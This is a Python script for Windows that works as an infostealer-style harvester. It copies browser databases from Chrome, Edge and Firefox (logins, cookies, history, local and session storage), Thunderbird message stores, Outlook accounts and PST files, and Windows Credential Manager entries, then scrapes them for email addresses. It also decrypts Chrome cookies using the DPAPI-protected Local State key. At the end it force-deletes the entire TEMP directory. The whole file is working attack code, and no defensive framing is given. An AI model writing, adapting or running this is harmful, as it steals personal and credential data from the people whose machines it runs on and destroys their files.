import sqlite3
import os
import re
import smtplib
import winreg
import time
import base64
import getpass
import requests, win32cred, win32com.client
from win32.win32crypt import CryptUnprotectData
from Crypto.Cipher.AES import new, MODE_GCM
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders 
import urllib.parse
from chardet import detect
import plyvel
import snappy
import json

USERNAME = getpass.getuser()
CHROME_BROWSER = 'chrome'
EDGE_BROWSER = 'edge'
chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
#os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe >nul 2>&1")

def decode_with_fallback(data):
    
    for encoding in ['utf-8', 'utf-16-le', 'latin1']:
        try:
            return data.decode(encoding), encoding
        except:
            continue

    encoding = detect(data)['encoding'] or 'utf-8'
    return data.decode(encoding, errors='replace'), encoding

def bytes_to_hex(byte_data):
    return f"b'{''.join(f'\\x{byte:02x}' for byte in byte_data)}'"

def get_decryption_key(local_state_path):
    with open(local_state_path, 'r') as f:
        ekey = json.load(f)['os_crypt']['encrypted_key']
        dkey = base64.b64decode(ekey)[5:]
        dkey = CryptUnprotectData(dkey, None, None, None, 0)
        return dkey

def decrypt_value(encrypted_value, key):
    try:
        cipher = new(key=key, mode=MODE_GCM, nonce=encrypted_value[3:15])
        decrypted_value = cipher.decrypt_and_verify(ciphertext=encrypted_value[15:-16], received_mac_tag=encrypted_value[-16:])
        # print(f"Decrypted cookie:\n  {bytes_to_hex(decrypted_value)}\n  {decrypted_value}")
        return decrypted_value.decode()
    except Exception as e:
        # print(f"Decryption failed: {e}")
        return None
    
def find_emails_in_json(data, email_pattern):
    emails = []
    if isinstance(data, dict):
        for v in data.values():
            emails.extend(find_emails_in_json(v, email_pattern))
    elif isinstance(data, list):
        for item in data:
            emails.extend(find_emails_in_json(item, email_pattern))
    elif isinstance(data, str):
        emails.extend(re.findall(email_pattern, data))
    return emails

def extract_json(value_str):
    json_start = re.search(r'[\{\[]', value_str)
    if json_start:
        return value_str[json_start.start():]
    return value_str

def chromEdgeOnly(chrome_path, email_pattern, browser_name):
    profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
    emails = []

    for profile in profiles:
        profile_name = profile.replace(" ", "_")
        wDatPath = os.path.join(chrome_path, profile, 'Web Data')
        twDatPath = os.path.join(os.getenv('TEMP'),f"wdat_{USERNAME}_{profile_name}_{browser_name}.db")
        if os.path.exists(wDatPath):
            os.system(f'copy "{wDatPath}" "{twDatPath}"')
            conn = sqlite3.connect(twDatPath)
            cur = conn.cursor()
            cur.execute("SELECT value FROM autofill WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                #print(val[0])
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        lsDatPath = os.path.join(chrome_path, profile, 'Local Storage', 'leveldb')
        tlsDatPath = os.path.join(os.getenv('TEMP'), f"lsdat_{USERNAME}_{profile_name}_{browser_name}")
        if os.path.isdir(lsDatPath):
            try:
                print(f"ATTEMPTING TO READ FROM LOCAL STORAGE!!! for {profile} and {browser_name}")
                os.system(f'robocopy "{lsDatPath}" "{tlsDatPath}" /MIR /COPYALL >nul 2>&1')
                db = plyvel.DB(str(tlsDatPath), create_if_missing=False)
                for key, value in db:
                    try:
                        key_str = key.decode('utf-8', errors='replace')
                        if key_str.startswith("META"):
                            continue
                        if value.startswith(b'\x00\x00\x00\x00') or value.startswith(b'\x01\x00\x00\x00'):  # Snappy compressed block indicator
                            try:
                                value = snappy.uncompress(value[4:])
                                emails.extend(re.findall(email_pattern, value.decode('utf-8')))
                                continue
                            except Exception as e :
                                print(f"Error decompressing value: {e}, skipping this entry.")
                        value_str, value_enc = decode_with_fallback(value)
                        value_str = value_str.replace('\u263a', '').strip()
                        value_str = extract_json(value_str)
                        print(f"for value : {value_enc}")
                        decoded = f"{key_str} {value_str}"
                        #print(decoded)
                        print(value_str.strip())
                        if value_str.strip().startswith('{') or value_str.strip().startswith('['):
                            try:
                                json_data = json.loads(value_str)
                                #value_str = json.dumps(json_data, indent=2)
                                #value_str = urllib.parse.unquote(value_str)
                                #emails.extend(re.findall(email_pattern, value_str))
                                emails.extend(find_emails_in_json(json_data, email_pattern))
                                continue
                            except:
                                pass
                        emails.extend(re.findall(email_pattern, key_str))
                        emails.extend(re.findall(email_pattern, value_str))
                    except Exception as e:
                        print(f"Error processing entry with key {key_str}: {e}")
                        continue
                db.close()
            except Exception as e:
                print(f"ERROR PARSING LOCAL STORAGE : {e}")

        ssDatPath = os.path.join(chrome_path, profile, 'Session Storage')
        tssDatPath = os.path.join(os.getenv('TEMP'), f"ssDat_{USERNAME}_{profile_name}_{browser_name}")
        if os.path.isdir(ssDatPath):
            try:
                print(f"ATTEMPTING TO READ FROM SESSION STORAGE!!! for {profile} and {browser_name}")
                os.system(f'robocopy "{ssDatPath}" "{tssDatPath}" /MIR /COPYALL >nul 2>&1')
                db = plyvel.DB(str(tssDatPath), create_if_missing=False)
                for key, value in db:
                    try:
                        key_str = key.decode('utf-8', errors='replace')
                        if value.startswith(b'\x01\x00\x00\x00') or value.startswith(b'\x00\x00\x00\x00'):  # Snappy compressed block indicator
                            try:
                                value = snappy.uncompress(value[4:])
                                emails.extend(re.findall(email_pattern, value.decode('utf-8')))
                                continue
                            except Exception as e :
                                print(f"Error decompressing value: {e}, skipping this entry.")
                        value_str, value_enc = decode_with_fallback(value)
                        print(f"for value : {value_enc}")
                        decoded = f"{key_str} {value_str}"
                        #print(decoded)
                        emails.extend(re.findall(email_pattern, key_str))
                        emails.extend(re.findall(email_pattern, value_str))
                    except Exception as e:
                        print(f"Error processing entry with key {key_str}: {e}")
                db.close()
            except Exception as e:
                print(f"ERROR PARSING SESSION STORAGE : {e}")

        lDatPath = os.path.join(chrome_path, profile, 'Login Data')
        tlDatPath = os.path.join(os.getenv('TEMP'), f"ldat_{USERNAME}_{profile_name}_{browser_name}.db")
        if os.path.exists(lDatPath):
            os.system(f'copy "{lDatPath}" "{tlDatPath}"')
            conn = sqlite3.connect(tlDatPath)
            cur = conn.cursor()
            cur.execute("SELECT username_value FROM logins")
            for val in cur.fetchall():
                #print(val[0])
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        hDatPath = os.path.join(chrome_path, profile, 'History')
        thDatPath = os.path.join(os.getenv('TEMP'), f"hDat_{USERNAME}_{profile_name}_{browser_name}.db")
        if os.path.exists(hDatPath):
            os.system(f'copy "{hDatPath}" "{thDatPath}"')
            conn = sqlite3.connect(thDatPath)
            cur = conn.cursor()
            cur.execute("PRAGMA integrity_check;")
            result = cur.fetchone()
            if(result[0] != "ok"):
                cur.execute("PRAGMA journal_mode = WAL;")
                cur.execute("PRAGMA wal_checkpoint(FULL);")
                conn.commit()

            cur.execute("SELECT url FROM urls WHERE url LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    decoded_string = urllib.parse.unquote(val[0])
                    matches = re.findall(email_pattern, decoded_string)
                    emails.extend(matches)
                except Exception as e:
                    print(f"Error processing URL {val[0]}: {e}")
            conn.close()

        cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
        tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat_{USERNAME}_{profile_name}_{browser_name}.db")
        if os.path.exists(cDatPath):
            os.system(f'copy "{cDatPath}" "{tcDatPath}"')
            conn = sqlite3.connect(tcDatPath)
            cur = conn.cursor()
            cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
            decrypted_key = get_decryption_key(local_state_path)[1]
            #print(decrypted_key)
            for val in cur.fetchall():
                encrypted_value = val[0]
                if encrypted_value is None or len(encrypted_value) == 0:
                    continue
                decrypted_value = decrypt_value(encrypted_value, decrypted_key)
                # print(decrypted_value)
            
            conn.close()

    return emails

def firefox(firefox_path, email_pattern):
    emails = []
    for profile in os.listdir(firefox_path):
        profile_name = profile.replace(" ", "_")
        fh = os.path.join(firefox_path, profile, 'formhistory.sqlite')
        tfh = os.path.join(os.getenv('TEMP'), f"fh_{USERNAME}_{profile_name}_firefox.db")
        ck = os.path.join(firefox_path, profile, 'cookies.sqlite')
        tck = os.path.join(os.getenv('TEMP'), f"ck_{USERNAME}_{profile_name}_firefox.db")
        bh = os.path.join(firefox_path, profile, 'places.sqlite')
        tbh = os.path.join(os.getenv('TEMP'), f"bh_{USERNAME}_{profile_name}_firefox.db")
        lg = os.path.join(firefox_path, profile, 'logins.json')
        tlg = os.path.join(os.getenv('TEMP'), f"lg_{USERNAME}_{profile_name}_firefox.json")
        lgb = os.path.join(firefox_path, profile, 'logins-backup.json')
        tlgb = os.path.join(os.getenv('TEMP'), f"lgb_{USERNAME}_{profile_name}_firefox.json")
        if os.path.exists(fh):
            os.system(f'copy "{fh}" "{tfh}"')
            conn = sqlite3.connect(tfh)
            cur = conn.cursor()
            cur.execute("SELECT value FROM moz_formhistory WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()
        
        if os.path.exists(ck):
            os.system(f'copy "{ck}" "{tck}"')
            conn = sqlite3.connect(tck)
            cur = conn.cursor()
            cur.execute("SELECT value FROM moz_cookies WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        if os.path.exists(bh):
            os.system(f'copy "{bh}" "{tbh}"')
            conn = sqlite3.connect(tbh)
            cur = conn.cursor()
            cur.execute("SELECT url FROM moz_places WHERE url LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    decoded_string = urllib.parse.unquote(val[0])
                    matches = re.findall(email_pattern, decoded_string)
                    emails.extend(matches)
                except:
                    pass
            conn.close()
        
        if os.path.exists(lg):
            os.system(f'copy "{lg}" "{tlg}"')
            with open(tlg, "r", encoding="utf-8") as f:
                lgs = json.load(f)
                for login in lgs.get("logins", []):
                   u = login.get("usernameField", "")
                   matches = re.findall(email_pattern, u)
                   emails.extend(matches)
        
        if os.path.exists(lgb):
            os.system(f'copy "{lgb}" "{tlgb}"')
            with open(tlgb, "r", encoding="utf-8") as f:
                lgs = json.load(f)
                for login in lgs.get("logins", []):
                    u = login.get("usernameField", "")
                    matches = re.findall(email_pattern, u)
                    emails.extend(matches)

    return emails

def thunderbird(thunderbird_path, email_pattern):
    emails = []
    for profile in os.listdir(thunderbird_path):
        profile_name = profile.replace(" ", "_")
        gmd = os.path.join(thunderbird_path, profile, 'global-messages-db.sqlite')
        tgmd = os.path.join(os.getenv('TEMP'), f"gmd_{USERNAME}_{profile_name}_thunderbird.db")
        tfh = os.path.join(thunderbird_path, profile, 'formhistory.sqlite')
        ttfh = os.path.join(os.getenv('TEMP'), f"tfh_{USERNAME}_{profile_name}_thunderbird.db")
        pl = os.path.join(thunderbird_path, profile, 'places.sqlite')
        tpl = os.path.join(os.getenv('TEMP'), f"pl_{USERNAME}_{profile_name}_thunderbird.db")
        if os.path.exists(gmd):
            os.system(f'copy "{gmd}" "{tgmd}"')
            conn = sqlite3.connect(tgmd)
            cur = conn.cursor()
            cur.execute("SELECT name FROM contacts")
            for val in cur.fetchall():
                try:
                    emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            cur.execute("SELECT subject FROM conversations")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            cur.execute("SELECT c0subject FROM conversationsText_content")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            cur.execute("SELECT value FROM identities")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            cur.execute("SELECT c0body, c1subject, c2attachmentNames, c3author, c4recipients FROM messagesText_content")
            for val in cur.fetchall():
                try:
                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[0])))
                    emails.extend(re.findall(email_pattern, val[1]))
                    emails.extend(re.findall(email_pattern, val[2]))
                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[3])))
                    emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[4])))
                except:
                    pass
            conn.close()
        if os.path.exists(tfh):
            os.system(f'copy "{tfh}" "{ttfh}"')
            conn = sqlite3.connect(ttfh)
            cur = conn.cursor()
            cur.execute("SELECT value FROM moz_formhistory WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, val[0]))
                except: pass
            conn.close()
        if os.path.exists(pl):
            os.system(f'copy "{pl}" "{tpl}"')
            conn = sqlite3.connect(tpl)
            cur = conn.cursor()
            cur.execute("SELECT url FROM moz_places WHERE url LIKE '%@%'")
            for val in cur.fetchall():
                try: emails.extend(re.findall(email_pattern, urllib.parse.unquote(val[0])))
                except: pass
            conn.close()
    return emails

emails = []

for root, _, files in os.walk(os.getenv('TEMP')):
    for file in files:
        try:
            with open(os.path.join(root,file), 'r', errors='ignore') as f:
                data = f.read()
                emails.extend(re.findall(email_pattern, data))
        except: pass

chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
firefox_emails = firefox(firefox_path, email_pattern)
thunderbird_emails = thunderbird(thunderbird_path, email_pattern)

# emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
emails.extend(chrome_emails)
emails.extend(edge_emails)
emails.extend(firefox_emails)
emails.extend(thunderbird_emails)

try:
    # Method 1: Outlook COM API
    outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
    for account in outlook.Accounts:
        emails.append(account.CurrentUser.Address)
    # Method 2: Raid PST files from registry
    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Office\16.0\Outlook\Profiles')
    for i in range(winreg.QueryInfoKey(reg_key)[0]):
        subkey_name = winreg.EnumKey(reg_key, i)
        subkey = winreg.OpenKey(reg_key, subkey_name)
        try:
            pst_path, _ = winreg.QueryValueEx(subkey, '001f6700')
            with open(pst_path, 'rb') as f:
                data = f.read()
                emails.extend(re.findall(email_pattern.encode('utf-8'), data))
        except: pass
except: pass 

try:
    outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
    for folder in outlook.Folders:
        for item in folder.Items:
            if item.Class == 43:
                emails.extend(item.SenderEmailAddress)
except: pass 

try:
    creds = win32cred.CredEnumerate(None, 0)
    for cred in creds:
        emails.extend(re.findall(email_pattern, cred['TargetName']))
        emails.extend(re.findall(email_pattern, cred['UserName']))
except Exception as e:
    print(f"ERROR FETCHING WIN CREDS : {e}")
    
emails = list(set(emails))

print("AFTER FILTERINGGG")
for email in emails:
    print(email)
        
print(len(emails))

os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")